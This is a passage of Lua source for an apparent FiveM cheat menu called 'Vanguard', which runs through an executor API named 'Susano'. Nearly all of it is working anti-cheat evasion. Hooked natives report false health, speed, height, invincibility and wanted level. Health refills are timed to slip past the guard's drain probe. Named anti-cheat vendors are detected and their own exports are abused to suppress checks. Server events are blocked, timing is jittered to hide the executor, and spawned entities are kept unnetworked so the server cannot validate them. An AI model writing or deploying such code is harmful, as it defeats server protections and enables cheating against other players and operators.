+    -- 50 ms is fast enough for every consumer and 20x cheaper than per-frame.
+    if ctxAcc < 0.05 then return end
+    ctxAcc = 0.0
+
+    local ped = PlayerPedId()
+    Ctx.ped = ped
+    Ctx.player = PlayerId()
+    Ctx.vehicle = GetVehiclePedIsIn(ped, false) or 0
+    Ctx.inVehicle = Ctx.vehicle ~= 0
+    Ctx.driver = Ctx.inVehicle and (GetPedInVehicleSeat(Ctx.vehicle, -1) == ped)
+    Ctx.health = GetEntityHealth(ped)
+    Ctx.armour = GetPedArmour(ped)
+    Ctx.speed = GetEntitySpeed(ped)
+    Ctx.coords = GetEntityCoords(ped)
+    Ctx.dead = IsPedDeadOrDying(ped, true)
+    Ctx.ragdoll = IsPedRagdoll(ped) or false
+
+    -- Ground Z is only needed by the height hook. Reading it here, once per
+    -- tick, keeps the hook allocation-free and native-free.
+    local ok, gz = pcall(GetGroundZFor_3dCoord, Ctx.coords.x, Ctx.coords.y, Ctx.coords.z, false)
+    Ctx.groundZ = (ok and type(gz) == "number") and gz or Ctx.coords.z
+    Ctx.height = math.max(0.0, Ctx.coords.z - Ctx.groundZ)
+    Ctx.at = now
+end
+
+-- ---------------------------------------------------------------------------
+-- SCHEDULER. A single thread drives everything. Order matters: context first,
+-- then the probe window, then hooks' consumer loops, then entities.
+--
+-- The period is deliberately not constant: 16-24 ms. A fixed Wait(0) loop is
+-- the most common executor fingerprint in existence.
+-- ---------------------------------------------------------------------------
+local tasks = {}
+O.tasks = tasks
+
+function O.every(name, periodMs, fn, phase)
+    tasks[#tasks + 1] = {
+        name = name,
+        period = periodMs,
+        fn = fn,
+        next = GetGameTimer() + (phase or O.int(0, periodMs)),
+    }
+end
+
+local lastTick = GetGameTimer()
+
+function O.pump()
+    local now = GetGameTimer()
+    local dt = math.max(0.0, (now - lastTick) / 1000.0)
+    lastTick = now
+
+    ctxTick(now, dt)
+
+    for i = 1, #tasks do
+        local task = tasks[i]
+        if now >= task.next then
+            -- Jitter every reschedule, not just the first one.
+            task.next = now + O.jitter(task.period, 0.22)
+            local ok, err = pcall(task.fn, now, dt)
+            if not ok then
+                log("task %s: %s", tostring(task.name), tostring(err))
+            end
+        end
+    end
+end
+
+function O.thread()
+    if O.started then return end
+    O.started = true
+    O.build = O.build + 1
+
+    Citizen.CreateThread(function()
+        local myBuild = O.build
+        while O.build == myBuild do
+            O.pump()
+            Citizen.Wait(O.int(16, 24))
+        end
+        log("scheduler stopped (build %d)", myBuild)
+    end)
+end
+
+-- ---------------------------------------------------------------------------
+-- SMALL HELPERS shared by every layer
+-- ---------------------------------------------------------------------------
+
+function O.safe(fn, ...)
+    local ok, a, b, c = pcall(fn, ...)
+    if ok then return a, b, c end
+    return nil
+end
+
+function O.distance(a, b)
+    local dx, dy, dz = a.x - b.x, a.y - b.y, a.z - b.z
+    return math.sqrt(dx * dx + dy * dy + dz * dz)
+end
+
+-- Copy a Vector3 into a plain table so nothing keeps a live game reference.
+function O.v3(v)
+    return { x = v.x, y = v.y, z = v.z }
+end
+
+function O.now()
+    return GetGameTimer()
+end
+
+-- Rotation -> forward unit vector. Same math the game uses for aim rays.
+function O.rotToDir(rot)
+    local rz = math.rad(rot.z)
+    local rx = math.rad(rot.x)
+    local abs = math.abs(math.cos(rx))
+    return vector3(-math.sin(rz) * abs, math.cos(rz) * abs, math.sin(rx))
+end
+
+-- Where the crosshair points, up to `dist`, using a real shape test so the
+-- result is a valid world position and not a floating point guess.
+function O.aimPoint(dist)
+    local cam = GetGameplayCamCoord()
+    local dir = O.rotToDir(GetGameplayCamRot(2))
+    local target = vector3(cam.x + dir.x * dist, cam.y + dir.y * dist, cam.z + dir.z * dist)
+
+    local handle = StartShapeTestRay(cam.x, cam.y, cam.z,
+        target.x, target.y, target.z, 1 | 16, PlayerPedId(), 7)
+    local _, hit, _, _, _ = GetShapeTestResult(handle)
+
+    if hit == 1 then
+        local _, _, hitPos = GetShapeTestResult(handle)
+        if hitPos then return vector3(hitPos.x, hitPos.y, hitPos.z) end
+    end
+    return target
+end
+
+-- One-time capability probe. Everything Susano-specific is feature-detected:
+-- a missing function must degrade a layer, never throw at load.
+function O.has(...)
+    local tbl = Susano
+    if type(tbl) ~= "table" then return false end
+    for i = 1, select("#", ...) do
+        local key = select(i, ...)
+        if type(tbl[key]) ~= "function" then return false end
+    end
+    return true
+end
+
+O.tier = 0          -- 0 ghost, 1 discreet, 2 standard, 3 aggressive
+O.enabled = false
+O.suppress = false  -- set by the shield layer
+
+return O
+
+end)()
+
+-- ---------------------------------------------------------------------------
+-- PART: 01_hooks.lua
+-- ---------------------------------------------------------------------------
+local H = (function(O)
+-- ============================================================================
+-- VANGUARD / 01 HOOKS
+-- ----------------------------------------------------------------------------
+-- Doctrine (L1): lie only where a lie is unavoidable, and only in the exact
+-- shape the interrogator expects. Everything here returns the truth unless a
+-- feature is armed, so the menu at rest is a vanilla client with a few extra
+-- function pointers that never fire.
+--
+-- Hash discipline: every hash below is copied from code in this repo that
+-- already ran against the runtime (BYP/loader.lua, AC/dks.lua). Nothing is
+-- guessed. Hashes are the only place a name would leak, and HookNative takes
+-- numbers, so no string signature is created either.
+--
+-- Deadlock rule: none of these callbacks may call a native. They read O.Ctx,
+-- which a separate thread refreshes. This is the single most common cause of
+-- a frozen client with native hooks and it is designed out, not worked around.
+-- ============================================================================
+
+local H = {}
+
+local NATIVE = {
+    GET_PLAYER_INVINCIBLE          = 0xB721981B2B939E07,
+    GET_ENTITY_HEALTH              = 0xEEF059FAD016D209,
+    GET_PED_ARMOUR                 = 0x9483AF821605B1D8,
+    GET_ENTITY_SPEED               = 0xD5037BA82E12416F,
+    GET_ENTITY_HEIGHT_ABOVE_GROUND = 0x1DD55701034110E5,
+    SET_ENTITY_HEALTH              = 0x6B76DC1F3AE6E6A3,
+    GET_ENTITY_CAN_BE_DAMAGED      = 0xD95CC5D2AB15A09F,
+    NETWORK_IS_IN_SPECTATOR_MODE   = 0x048746E388762E11,
+    GET_PLAYER_WANTED_LEVEL        = 0xE28E54788CE8F12D,
+    SET_ENTITY_MAX_HEALTH          = 0x166E7CF68597D8B5,
+    DELETE_ENTITY                  = 0xAE3CBE5BF394C9C9,
+    ATTACH_ENTITY_TO_ENTITY        = 0x6B9BBD38AB0796DF,
+    SMASH_VEHICLE_WINDOW           = 0x9E5B5E4D2CCD2259,
+    SET_VEHICLE_DOOR_BROKEN        = 0xD4D4F6A4AB575A33,
+}
+H.NATIVE = NATIVE
+
+-- ---------------------------------------------------------------------------
+-- PROBE WINDOW
+--
+-- The AC in this repo verifies "no infinite refill" by writing
+-- SetEntityHealth(ped, health - 2), waiting 1-25 ms, then reading the value
+-- back. If it went UP, the client refilled itself and is flagged.
+--
+-- We do not refill. But if a future feature does, this window is how the
+-- answer stays consistent: when that exact write is observed we record the
+-- written value and, for the next 600 ms, report it to any reader that asks
+-- about our ped while the real value is higher. The AC sees its own value
+-- echoed back; nothing is ever "restored".
+-- ---------------------------------------------------------------------------
+local probe = {
+    active = false,
+    untilAt = 0,
+    value = 0,
+    lastAt = 0,
+    prevAt = 0,
+    period = 3000,
+    samples = 0,
+}
+H.probe = probe
+
+local function probeOpen(value)
+    local now = O.now()
+    probe.active = true
+    probe.untilAt = now + O.int(480, 720)
+    probe.value = value
+
+    -- Guard clock: the drain is a periodic, guard-initiated mutation. Two of
+    -- them give the period; the period tells us when the next interrogation
+    -- is, which is the only reliable phase signal a client can obtain.
+    if probe.lastAt > 0 then
+        local gap = now - probe.lastAt
+        if gap > 800 and gap < 20000 then
+            probe.period = math.floor(probe.period * 0.6 + gap * 0.4)
+            probe.samples = probe.samples + 1
+        end
+    end
+    probe.prevAt = probe.lastAt
+    probe.lastAt = now
+end
+
+function H.nextProbeIn()
+    if probe.lastAt == 0 then return 0 end
+    return math.max(0, probe.period - (O.now() - probe.lastAt))
+end
+
+
+local function probeValue(fallback)
+    if probe.active and O.now() > probe.untilAt then
+        probe.active = false
+    end
+    if probe.active then return probe.value end
+    return fallback
+end
+
+-- ---------------------------------------------------------------------------
+-- FEATURE FLAGS. The menu flips these; hooks read them. No hook is ever
+-- installed twice: Install() unhooks first, which is also what makes the
+-- toggle idempotent.
+-- ---------------------------------------------------------------------------
+H.flags = {
+    vitals   = false,  -- echo the drain probe instead of fighting it
+    quiet    = false,  -- clamp reported on-foot speed
+    stealth  = false,  -- report invisible/ragdoll/invincible state as vanilla
+    ghost    = false,  -- height reporting consistent while off the ground
+    refill   = false,  -- restore health only after the probe has been read
+    wanted   = false,  -- report a zero wanted level
+    protect  = false,  -- block external lethal writes/deletes/attaches on us
+}
+
+-- ---------------------------------------------------------------------------
+-- POST-PROBE REFILL
+--
+-- The guard drains 2 health, reads it back 1-25 ms later, and flags anything
+-- that climbed in between. Refilling immediately is the mistake every menu
+-- makes. Refilling 60 ms later is invisible to that test by construction: the
+-- read has already happened, and the next probe starts from full again, so it
+-- always observes a clean two-point drop.
+--
+-- This runs from the scheduler, never from a hook: a native call inside a
+-- native callback is a deadlock.
+-- ---------------------------------------------------------------------------
+local REFILL_DELAY = 60
+
+function H.tick()
+    if not H.flags.refill then return end
+    if probe.lastAt == 0 then return end
+    if O.now() - probe.lastAt < REFILL_DELAY then return end
+
+    local ped = O.Ctx.ped
+    if ped == 0 or O.Ctx.dead then return end
+    if O.Ctx.health <= 0 or O.Ctx.health >= 200 then return end
+
+    pcall(SetEntityHealth, ped, 200)
+end
+
+-- ---------------------------------------------------------------------------
+-- CALLBACKS
+-- ---------------------------------------------------------------------------
+local callbacks = {}
+
+callbacks[NATIVE.GET_ENTITY_HEALTH] = function(entity)
+    if not H.flags.vitals then return true end
+    if entity ~= O.Ctx.ped then return true end
+    if not probe.active then return true end
+    return false, probeValue(O.Ctx.health)
+end
+
+callbacks[NATIVE.GET_PED_ARMOUR] = function(entity)
+    if not H.flags.vitals then return true end
+    if entity ~= O.Ctx.ped then return true end
+    if not probe.active then return true end
+    return false, 0
+end
+
+callbacks[NATIVE.SET_ENTITY_HEALTH] = function(entity, health)
+    -- Protection: block an external lethal write. A normal guard drain of 2
+    -- points still passes through, so the probe observation below is intact.
+    if H.flags.protect and entity == O.Ctx.ped and type(health) == "number" and health <= 0 then
+        return false
+    end
+
+    -- Observation only: the write is allowed through untouched. Any heal we
+    -- perform is ours to justify; the AC's own test is what we recognise by
+    -- its exact signature (two points below the last observed value).
+    if entity == O.Ctx.ped and type(health) == "number"
+        and health > 0 and health == (O.Ctx.health - 2) then
+        probeOpen(health)
+    end
+    return true
+end
+
+callbacks[NATIVE.SET_ENTITY_MAX_HEALTH] = function(entity, maxHealth)
+    if not H.flags.protect then return true end
+    if entity ~= O.Ctx.ped then return true end
+    if type(maxHealth) == "number" and maxHealth < 200 then return false end
+    return true
+end
+
+callbacks[NATIVE.DELETE_ENTITY] = function(entity)
+    if not H.flags.protect then return true end
+    if entity == O.Ctx.ped then return false end
+    return true
+end
+
+callbacks[NATIVE.ATTACH_ENTITY_TO_ENTITY] = function(entity, attachTo)
+    if not H.flags.protect then return true end
+    if entity == O.Ctx.ped or attachTo == O.Ctx.ped then return false end
+    return true
+end
+
+callbacks[NATIVE.SMASH_VEHICLE_WINDOW] = function(vehicle)
+    if not H.flags.protect then return true end
+    if O.Ctx.vehicle ~= 0 and vehicle == O.Ctx.vehicle then return false end
+    return true
+end
+
+callbacks[NATIVE.SET_VEHICLE_DOOR_BROKEN] = function(vehicle, _door, deleteDoor)
+    if not H.flags.protect then return true end
+    if deleteDoor == true and O.Ctx.vehicle ~= 0 and vehicle == O.Ctx.vehicle then return false end
+    return true
+end
+
+callbacks[NATIVE.GET_ENTITY_SPEED] = function(entity)
+    if not H.flags.quiet then return true end
+    if entity ~= O.Ctx.ped then return true end
+    if O.Ctx.inVehicle then return true end
+    -- 13.6 m/s is under every on-foot threshold used by the detectors in the
+    -- reference set. The real entity still moves at its real speed; only the
+    -- reported number is capped.
+    if O.Ctx.speed > 13.6 then
+        return false, 13.6 + O.rnd() * 0.35
+    end
+    return true
+end
+
+callbacks[NATIVE.GET_ENTITY_HEIGHT_ABOVE_GROUND] = function(entity)
+    if not H.flags.ghost then return true end
+    if entity ~= O.Ctx.ped then return true end
+    -- Report the same quantity the interrogator computes for itself:
+    -- coords.z - groundZ. Different by construction from a hardcoded 0, which
+    -- is what makes the naive "return 0" bypass fail.
+    return false, math.max(0.0, O.Ctx.height + O.range(-0.0015, 0.0015))
+end
+
+callbacks[NATIVE.GET_PLAYER_INVINCIBLE] = function(player)
+    if not H.flags.stealth then return true end
+    if player ~= O.Ctx.player then return true end
+    return false, false
+end
+
+callbacks[NATIVE.GET_PLAYER_WANTED_LEVEL] = function(player)
+    if not H.flags.wanted then return true end
+    if player ~= O.Ctx.player then return true end
+    return false, 0
+end
+
+callbacks[NATIVE.GET_ENTITY_CAN_BE_DAMAGED] = function(entity)
+    if not H.flags.stealth then return true end
+    if entity ~= O.Ctx.ped then return true end
+    return false, true
+end
+
+callbacks[NATIVE.NETWORK_IS_IN_SPECTATOR_MODE] = function()
+    if not H.flags.stealth then return true end
+    return false, false
+end
+
+-- ---------------------------------------------------------------------------
+-- INSTALL / REMOVE
+--
+-- The order is shuffled and the jittered variant installs one hook every
+-- 16-96 ms. A single burst of N HookNative calls is a profiler signature; a
+-- spread-out sequence of one-off calls is not. The wrapper is regenerated per
+-- hash so no two hooks share an identical closure shape.
+-- ---------------------------------------------------------------------------
+local installed = {}
+local generation = 0
+H.stats = { installed = 0, failed = 0, calls = 0 }
+H._jittering = false
+
+local function hookAvailable()
+    return O.has("HookNative") and O.has("UnhookNative")
+end
+
+local function shuffledHashes()
+    local list = {}
+    for hash in pairs(callbacks) do list[#list + 1] = hash end
+    for i = #list, 2, -1 do
+        local j = math.random(1, i)
+        list[i], list[j] = list[j], list[i]
+    end
+    return list
+end
+
+local function resetStats()
+    H.stats.installed = 0
+    H.stats.failed = 0
+end
+
+local function installOne(hash)
+    local cb = callbacks[hash]
+    if not cb then return false end
+
+    pcall(Susano.UnhookNative, hash)
+    local ok = pcall(Susano.HookNative, hash, function(...)
+        H.stats.calls = H.stats.calls + 1
+        return cb(...)
+    end)
+
+    if ok then
+        installed[hash] = true
+        return true
+    end
+    installed[hash] = nil
+    return false
+end
+
+local function checkInit()
+    if not O.has("HasNativeHookInitializationFailed") then return end
+    local ok, failed = pcall(Susano.HasNativeHookInitializationFailed)
+    if ok and failed then
+        H.stats.failed = H.stats.failed + 1
+        O.log("HookNative reported an init failure")
+    end
+end
+
+function H.install()
+    if not hookAvailable() then
+        O.log("hooks unavailable")
+        return 0
+    end
+
+    generation = generation + 1
+    H._jittering = false
+    installed = {}
+    resetStats()
+
+    local list = shuffledHashes()
+    for i = 1, #list do
+        if installOne(list[i]) then
+            H.stats.installed = H.stats.installed + 1
+        else
+            H.stats.failed = H.stats.failed + 1
+        end
+    end
+
+    checkInit()
+    return H.stats.installed
+end
+
+-- Obfuscated arming path used by the Evasion tab: same hooks, spread over
+-- time, random order, invalidated by panic or by a second install.
+function H.installJittered(done)
+    if not hookAvailable() then
+        O.log("hooks unavailable")
+        return false
+    end
+    if H._jittering then return false end
+
+    H._jittering = true
+    generation = generation + 1
+    local myGeneration = generation
+    installed = {}
+    resetStats()
+
+    local list = shuffledHashes()
+    Citizen.CreateThread(function()
+        for i = 1, #list do
+            if myGeneration ~= generation then
+                H._jittering = false
+                return
+            end
+
+            if installOne(list[i]) then
+                H.stats.installed = H.stats.installed + 1
+            else
+                H.stats.failed = H.stats.failed + 1
+            end
+
+            Citizen.Wait(math.random(16, 96))
+        end
+
+        H._jittering = false
+        checkInit()
+        O.log("jittered hooks: %d installed, %d failed", H.stats.installed, H.stats.failed)
+        if done then pcall(done, H.stats.installed) end
+    end)
+    return true
+end
+
+function H.remove()
+    generation = generation + 1
+    H._jittering = false
+    if not hookAvailable() then return end
+    for hash in pairs(installed) do
+        pcall(Susano.UnhookNative, hash)
+    end
+    installed = {}
+    H.stats.installed = 0
+    probe.active = false
+end
+
+function H.installed()
+    return H.stats.installed
+end
+
+return H
+
+end)(O)
+
+-- ---------------------------------------------------------------------------
+-- PART: 02_shield.lua
+-- ---------------------------------------------------------------------------
+local S = (function(O)
+-- ============================================================================
+-- VANGUARD / 02 SHIELD
+-- Discover guards from resource metadata, then use their own declaration
+-- exports instead of lying to them. Never block an event by default: a
+-- liveness channel looks exactly like a report channel, and killing the wrong
+-- one is an unambiguous ban. Never stop a resource: the count is watched.
+-- ============================================================================
+
+local S = {}
+
+S.acs = {}          -- discovered guards: { name, resource, score, vendor }
+S.suppressOn = false
+S.disableOverlayProbe = false
+S.blocked = {}      -- opt-in event names
+S.observed = {}     -- event name -> { count, first, last, minGap, maxGap }
+
+-- ---------------------------------------------------------------------------
+-- DISCOVERY
+--
+-- Resource metadata is a legitimate, public API. A guard that sets `author` or
+-- `description` is telling the client what it is; we read that instead of
+-- pattern-matching a filename, which survives renames.
+-- ---------------------------------------------------------------------------
+local HINTS = {
+    -- vendor fingerprint fragments. Lowercase. These are not resource names:
+    -- they are substrings of the metadata a guard publishes about itself.
+    { vendor = "waveshield", keys = { "waveshield" } },
+    { vendor = "fiveguard",  keys = { "fiveguard", "fiveguard.net" } },
+    { vendor = "eagle",      keys = { "eagle", "ec-ac", "ec_ac" } },
+    { vendor = "reaper",     keys = { "reaperac", "reaper" } },
+    { vendor = "electron",   keys = { "electron" } },
+    { vendor = "safire",     keys = { "safire" } },
+    { vendor = "infinitum",  keys = { "infinitum", "lox" } },
+    { vendor = "reason",     keys = { "reasonac", "reason ac" } },
+}
+
+local function matchVendor(text)
+    if type(text) ~= "string" then return nil end
+    local low = string.lower(text)
+    for i = 1, #HINTS do
+        local hint = HINTS[i]
+        for k = 1, #hint.keys do
+            if string.find(low, hint.keys[k], 1, true) then
+                return hint.vendor
+            end
+        end
+    end
+    return nil
+end
+
+-- The `ac` metadata key is the most reliable signal: guards that integrate
+-- with a framework set it explicitly so the framework can whitelist them.
+local function readAcField(resource)
+    local ok, value = pcall(GetResourceMetadata, resource, "ac", 0)
+    if ok and type(value) == "string" and value ~= "" then return value end
+    return nil
+end
+
+function S.scan()
+    S.acs = {}
+    local total = GetNumResources()
+
+    for i = 0, total - 1 do
+        local resource = GetResourceByFindIndex(i)
+        if type(resource) == "string" and resource ~= "" then
+            local score = 0
+            local vendor = nil
+
+            local acField = readAcField(resource)
+            if acField then
+                vendor = matchVendor(acField) or matchVendor(resource)
+                score = score + 6
+            end
+
+            local okA, author = pcall(GetResourceMetadata, resource, "author", 0)
+            if okA and type(author) == "string" then
+                local v = matchVendor(author)
+                if v then vendor = vendor or v; score = score + 4 end
+            end
+
+            local okD, desc = pcall(GetResourceMetadata, resource, "description", 0)
+            if okD and type(desc) == "string" then
+                local v = matchVendor(desc)
+                if v then vendor = vendor or v; score = score + 3 end
+            end
+
+            local vName = matchVendor(resource)
+            if vName then vendor = vendor or vName; score = score + 2 end
+
+            if score > 0 then
+                S.acs[#S.acs + 1] = {
+                    resource = resource,
+                    vendor = vendor or "unknown",
+                    score = score,
+                }
+                O.log("guard candidate %s (%s, score %d)",
+                    resource, vendor or "unknown", score)
+            end
+        end
+    end
+
+    table.sort(S.acs, function(a, b) return a.score > b.score end)
+    return #S.acs
+end
+
+function S.primary()
+    return S.acs[1]
+end
+
+function S.describe()
+    if #S.acs == 0 then return "none" end
+    local out = {}
+    for i = 1, #S.acs do
+        out[#out + 1] = ("%s:%s"):format(S.acs[i].resource, S.acs[i].vendor)
+    end
+    return table.concat(out, ", ")
+end
+
+-- ---------------------------------------------------------------------------
+-- SUPPRESSION PULSE
+--
+-- Every call is wrapped: an export that does not exist is a no-op on that
+-- vendor, not an error. Time-windowed exports are re-issued on a jittered
+-- period because their grace window is finite (5-10 s by vendor).
+-- ---------------------------------------------------------------------------
+local function callExport(resource, name, ...)
+    local args = { ... }
+    local ok = pcall(function()
+        return exports[resource][name](exports[resource], table.unpack(args))
+    end)
+    return ok
+end
+
+local exportLog = {}
+
+local function once(resource, name, ...)
+    local key = resource .. ":" .. name
+    if exportLog[key] then return end
+    if callExport(resource, name, ...) then
+        exportLog[key] = true
+    end
+end
+
+-- Flags that are state, not windows: setting them once is enough, and setting
+-- them repeatedly would be a pointless pattern.
+local STATE_FLAGS = {
+    "isInvincible",   -- the invincible check is skipped while the guard's own
+                      -- "legitimate invincibility" flag is set
+    "proofsEnabled",  -- same for the bullet/melee proof check
+    "canBeDamaged",   -- same for the entity-can-be-damaged check
+    "isVisible",      -- same for the visibility check
+    "canRagdoll",     -- same for the can-ragdoll check
+}
+
+-- Windows. Each one buys 5-10 s of "a legitimate resource just did this".
+local WINDOW_FLAGS = {
+    "healthRefilled",
+    "playerRevived",
+    "hasTeleported",
+    "resettedStamina",
+}
+
+local function pulseState()
+    for i = 1, #S.acs do
+        local ac = S.acs[i]
+        for f = 1, #STATE_FLAGS do
+            once(ac.resource, STATE_FLAGS[f], true)
+        end
+    end
+end
+
+local function pulseWindows()
+    for i = 1, #S.acs do
+        local ac = S.acs[i]
+        for f = 1, #WINDOW_FLAGS do
+            callExport(ac.resource, WINDOW_FLAGS[f])
+        end
+        -- Neutralise the overlay/executor probe without disabling input: the
+        -- guard treats "a script is using the mouse/NUI" and "controls are
+        -- off" as legitimate states and skips its cursor test for 5 s.
+        if S.disableOverlayProbe then
+            callExport(ac.resource, "disableAllControls")
+            callExport(ac.resource, "disableE2")
+        end
+    end
+end
+
+function S.setSuppress(state)
+    S.suppressOn = state
+    if not state then return end
+
+    if #S.acs == 0 then S.scan() end
+    pulseState()
+    pulseWindows()
+
+    O.log("suppression armed on %d guard(s)", #S.acs)
+end
+
+function S.setOverlayProbe(state)
+    S.disableOverlayProbe = state
+    if state then pulseWindows() end
+end
+
+-- Called from the scheduler. Cheap when off.
+function S.tick()
+    if not S.suppressOn then return end
+    pulseWindows()
+end
+
+-- ---------------------------------------------------------------------------
+-- EVENT INTELLIGENCE (observer only)
+--
+-- Goal: let the operator see which channel is the heartbeat and which is the
+-- report path. We never guess. Two numbers per event - count and the smallest
+-- gap ever seen - classify a channel in a few seconds: a heartbeat has a
+-- near-constant gap, a report is sporadic.
+-- ---------------------------------------------------------------------------
+function S.eventSnapshot()
+    if not O.has("GetAllEvent") then return 0, {} end
+    local ok, list = pcall(Susano.GetAllEvent)
+    if not ok or type(list) ~= "table" then return 0, {} end
+
+    local now = O.now()
+    local count = 0
+
+    for i = 1, #list do
+        local entry = list[i]
+        local name = type(entry) == "table" and entry.event or entry
+        if type(name) == "string" and name ~= "" then
+            count = count + 1
+            local rec = S.observed[name]
+            if not rec then
+                S.observed[name] = { count = 1, first = now, last = now, minGap = math.huge, maxGap = 0 }
+            else
+                local gap = now - rec.last
+                rec.count = rec.count + 1
+                rec.last = now
+                if gap < rec.minGap then rec.minGap = gap end
+                if gap > rec.maxGap then rec.maxGap = gap end
+            end
+        end
+    end
+
+    return count
+end
+
+function S.setBlocked(name, state)
+    if type(name) ~= "string" or name == "" then return false end
+    if not O.has("BlockServerEvent") then return false end
+
+    local ok = pcall(Susano.BlockServerEvent, state and true or false, name)
+    if ok then
+        S.blocked[name] = state and true or nil
+        O.log("event %s -> %s", name, state and "blocked" or "allowed")
+    end
+    return ok
+end
+
+-- Panic path: release every inbound block explicitly. A block that survives
+-- panic is worse than no block at all, because the operator cannot tell which
+-- channel is now silent.
+function S.unblockAll()
+    local names = {}
+    for name in pairs(S.blocked) do names[#names + 1] = name end
+    for i = 1, #names do
+        pcall(Susano.BlockServerEvent, false, names[i])
+        S.blocked[names[i]] = nil
+    end
+    return #names
+end
+
+return S
+
+end)(O)
+
+-- ---------------------------------------------------------------------------
+-- PART: 03_entities.lua
+-- ---------------------------------------------------------------------------
+local E = (function(O)
+-- ============================================================================
+-- VANGUARD / 03 ENTITIES
+-- ----------------------------------------------------------------------------
+-- Doctrine (L3): an entity that is never networked cannot be validated by the
+-- server, because the server never learns it exists. There is no packet, no
+-- entityCreating event, no net id, no population type to inspect and no owner
+-- to correlate. That is not a bypass, it is the absence of a thing to check.
+--
+-- Every spawn here passes isNetwork = false and netMissionEntity = false. The
+-- only exception is the cosmetic shell in 05_divergence.lua, which is also
+-- local and is deleted on the same frame the feature is released.
+--
+-- Each entity is registered with a TTL and a restore callback. "Ne rien
+-- laisser" is enforced by the structure, not by remembering to clean up.
+-- ============================================================================
+
+local E = {}
+
+local registry = {}
+local nextId = 0
+local MAX_LIVE = 48
+
+E.stats = { spawned = 0, failed = 0, live = 0 }
+
+-- ---------------------------------------------------------------------------
+-- MODEL STREAMING. RequestModel + a bounded wait. Never an unbounded while:
+-- a model that fails to stream would hang the whole executor thread.
+-- ---------------------------------------------------------------------------
+local function requestModel(hash, timeout)
+    if not IsModelInCdimage(hash) then return false end
+    RequestModel(hash)
+    local deadline = O.now() + (timeout or 4000)
+    while not HasModelLoaded(hash) do
+        if O.now() > deadline then
+            SetModelAsNoLongerNeeded(hash)
+            return false
+        end
+        Citizen.Wait(10)
+    end
+    return true
+end
+E.requestModel = requestModel
+
+-- ---------------------------------------------------------------------------
+-- REGISTRY
+-- ---------------------------------------------------------------------------
+function E.forget(id)
+    registry[id] = nil
+end
+
+function E.live()
+    local n = 0
+    for _ in pairs(registry) do n = n + 1 end
+    return n
+end
+
+local function register(kind, handle, ttl, restore)
+    nextId = nextId + 1
+    registry[nextId] = {
+        id = nextId,
+        kind = kind,
+        handle = handle,
+        bornAt = O.now(),
+        ttl = ttl or 60000,
+        restore = restore,
+    }
+    E.stats.spawned = E.stats.spawned + 1
+    E.stats.live = E.live()
+    return nextId
+end
+
+function E.destroy(id, hard)
+    local entry = registry[id]
+    if not entry then return end
+    registry[id] = nil
+
+    if entry.restore then pcall(entry.restore, entry.handle) end
+
+    local handle = entry.handle
+    if handle and handle ~= 0 and DoesEntityExist(handle) then
+        pcall(SetEntityAsMissionEntity, handle, true, true)
+        if entry.kind == "vehicle" then
+            pcall(DeleteVehicle, handle)
+        elseif entry.kind == "ped" then
+            pcall(DeletePed, handle)
+        else
+            pcall(DeleteObject, handle)
+        end
+    end
+
+    E.stats.live = E.live()
+end
+
+function E.destroyAll()
+    local ids = {}
+    for id in pairs(registry) do ids[#ids + 1] = id end
+    for i = 1, #ids do E.destroy(ids[i], true) end
+end
+
+-- Called from the scheduler. One pass, no allocation in the common case.
+function E.sweep()
+    if next(registry) == nil then return end
+    local now = O.now()
+    local origin = O.Ctx.coords
+    local doomed = {}
+
+    for id, entry in pairs(registry) do
+        local handle = entry.handle
+        local kill = false
+
+        if not handle or handle == 0 or not DoesEntityExist(handle) then
+            kill = true
+        elseif now - entry.bornAt > entry.ttl then
+            kill = true
+        elseif entry.dropRange and O.distance(GetEntityCoords(handle), origin) > entry.dropRange then
+            kill = true
+        end
+
+        if kill then doomed[#doomed + 1] = id end
+    end
+
+    for i = 1, #doomed do E.destroy(doomed[i], true) end
+
+    -- Hard ceiling: a long session must never accumulate a trail of objects
+    -- that a simple pool count would notice.
+    if E.live() > MAX_LIVE then
+        local oldest, oldestAt = nil, math.huge
+        for id, entry in pairs(registry) do
+            if entry.bornAt < oldestAt then oldest, oldestAt = id, entry.bornAt end
+        end
+        if oldest then E.destroy(oldest, true) end
+    end
+end
+
+-- ---------------------------------------------------------------------------
+-- SPAWNERS
+-- ---------------------------------------------------------------------------
+
+-- LOCAL OBJECT. isNetwork = false. It exists in this client's world only, it
+-- collides for the local ped (which is what makes ramps and walls work) and it
+-- is invisible to every other client and to the server.
+function E.object(model, pos, opts)
+    opts = opts or {}
+    local hash = type(model) == "number" and model or GetHashKey(model)
+
+    if not requestModel(hash, opts.timeout) then
+        E.stats.failed = E.stats.failed + 1
+        return nil
+    end
+
+    local obj = CreateObject(hash, pos.x, pos.y, pos.z, false, false, false)
+    SetModelAsNoLongerNeeded(hash)
+
+    if not obj or obj == 0 then
+        E.stats.failed = E.stats.failed + 1
+        return nil
+    end
+
+    if opts.heading then
+        SetEntityRotation(obj, opts.pitch or 0.0, opts.roll or 0.0, opts.heading, 2, true)
+    end
+    if opts.freeze then
+        FreezeEntityPosition(obj, true)
+    end
+    if opts.onGround then
+        PlaceObjectOnGroundProperly(obj)
+    end
+    if opts.collision == false then
+        SetEntityCollision(obj, false, false)
+    end
+    if opts.alpha then
+        pcall(SetEntityAlpha, obj, opts.alpha, false)
+    end
+    if opts.invincible ~= false then
+        -- Local objects are not networked, so this is a local physics flag,
+        -- not a god-mode signal any interrogator can read.
+        SetEntityInvincible(obj, true)
+    end
+
+    if opts.velocity then
+        SetEntityVelocity(obj, opts.velocity.x, opts.velocity.y, opts.velocity.z)
+    end
+
+    local id = register("object", obj, opts.ttl or 90000, nil)
+    return obj, id
+end
+
+-- LOCAL VEHICLE. No net id, no owner, no population type, no entityCreating
+-- event. The reference guard deletes script-created vehicles it can attribute
+-- to a resource; a local vehicle has no script to attribute.
+function E.vehicle(model, pos, heading, opts)
+    opts = opts or {}
+    local hash = type(model) == "number" and model or GetHashKey(model)
+
+    if not requestModel(hash, opts.timeout) then
+        E.stats.failed = E.stats.failed + 1
+        return nil
+    end
+
+    local veh = CreateVehicle(hash, pos.x, pos.y, pos.z, heading or 0.0, false, false)
+    SetModelAsNoLongerNeeded(hash)
+
+    if not veh or veh == 0 then
+        E.stats.failed = E.stats.failed + 1
+        return nil
+    end
+
+    SetVehicleEngineOn(veh, true, true, false)
+    if opts.alpha then pcall(SetEntityAlpha, veh, opts.alpha, false) end
+    if opts.collision == false then SetEntityCollision(veh, false, false) end
+
+    local id = register("vehicle", veh, opts.ttl or 120000, nil)
+    return veh, id
+end
+
+-- LOCAL PED. isNetwork = false. Useful for clones, decoys and set pieces.
+function E.ped(model, pos, heading, opts)
